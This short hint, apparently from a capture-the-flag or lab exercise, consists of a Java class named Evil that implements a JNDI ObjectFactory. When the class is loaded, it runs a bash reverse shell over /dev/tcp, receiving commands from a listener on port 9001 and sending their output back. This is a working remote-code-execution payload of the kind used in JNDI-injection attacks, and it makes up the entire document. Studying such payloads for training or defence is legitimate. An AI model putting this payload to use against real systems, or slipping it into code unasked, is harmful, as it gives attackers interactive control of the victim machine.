# Hint 4

```java
public class Evil implements ObjectFactory {

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {

        String[] cmd = {
                "/bin/bash",
                "-c",
                "exec 5<>/dev/tcp/127.0.0.1/9001;cat <&5 | while read line; do $line 2>&5 >&5; done" };

        Runtime.getRuntime().exec(cmd);
        return null;
    }
}
```